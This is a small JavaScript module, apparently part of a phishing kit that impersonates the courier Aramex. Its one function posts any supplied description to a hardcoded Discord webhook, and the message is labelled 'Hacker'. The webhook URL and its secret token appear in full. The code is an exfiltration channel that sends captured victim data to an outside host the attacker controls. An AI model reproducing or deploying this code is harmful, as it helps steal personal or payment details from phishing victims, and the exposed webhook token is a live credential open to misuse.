import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323519255702011976/vGfxG06k6h9IcU9oUG5Z75NRMYX8ka1Jw_ORVQvL4iIEkXSg7AUMhuV-s_ZvS8oSErvv",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
